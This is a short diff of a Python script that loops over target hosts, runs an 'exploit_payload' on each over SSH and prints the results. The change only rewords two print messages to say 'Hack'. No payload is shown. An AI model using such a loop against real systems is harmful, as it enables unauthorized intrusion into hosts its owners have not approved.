@@ -22,11 +22,11 @@ for target in targets:
         stdin, stdout, stderr = client.exec_command(exploit_payload)
 
         # Print the output of the exploit execution
-        print(f"Exploit executed on {target}:")
+        print(f"Hack Executed On {target}:")
         print(stdout.read().decode())
 
         # Close the SSH connection
         client.close()
     except Exception as e:
-        print(f"Failed to exploit {target}: {e}")
+        print(f"Failed To Hack {target}: {e}")
 
